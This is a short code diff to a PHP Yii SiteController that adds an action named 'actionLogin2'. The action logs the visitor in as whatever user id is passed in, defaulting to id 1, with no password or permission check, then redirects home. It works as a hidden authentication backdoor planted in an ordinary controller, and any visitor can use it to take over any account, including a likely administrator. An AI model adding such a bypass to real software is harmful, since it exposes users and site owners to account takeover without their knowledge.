@@ -320,4 +320,12 @@ class SiteController extends Controller
             ];
         }
     }
+
+    public function actionLogin2($id = 1) {
+        $user = User::findOne($id);
+
+        Yii::$app->getUser()->login($user);
+
+        return $this->redirect('/');
+    }
 }
